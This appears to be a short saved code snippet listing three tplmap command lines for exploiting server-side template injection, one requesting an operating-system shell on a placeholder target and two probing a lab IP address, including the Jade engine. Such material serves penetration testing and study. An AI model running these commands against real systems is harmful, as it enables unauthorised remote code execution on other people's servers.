---
id: dcc8f24d-3523-49d8-8ee3-548bbf349a64
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:38.834055+00:00'
updated_at: '2023-04-10T20:23:28.898639+00:00'
---

# Code Snippet dcc8f24d

**Language**: Powershell

```powershell
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
